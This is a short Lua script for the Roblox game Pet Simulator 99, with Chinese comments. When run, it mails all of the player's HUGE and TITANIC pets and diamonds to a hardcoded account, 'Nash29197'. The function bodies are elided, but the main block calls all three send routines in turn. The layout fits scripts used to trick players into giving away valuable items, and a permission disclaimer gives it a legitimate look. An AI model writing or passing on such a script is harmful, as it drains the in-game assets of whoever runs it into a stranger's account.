-- 寵物模擬器99：寄送所有 HUGE 與 TITANIC 寵物及鑽石腳本
-- 請先確認您有權限執行此腳本，並於私人伺服器測試。

local recipient = "Nash29197" -- 接收者的遊戲帳號名稱
local message = "Sending all HUGE and TITANIC pets, and diamonds!" -- 可自訂的訊息
...
-- Main execution
print("Starting to send all HUGE and TITANIC pets and diamonds...")
sendAllHugePets()
sendAllTitanicPets()
sendAllDiamonds()
print("All HUGE and TITANIC pets and diamonds have been sent to " .. recipient)
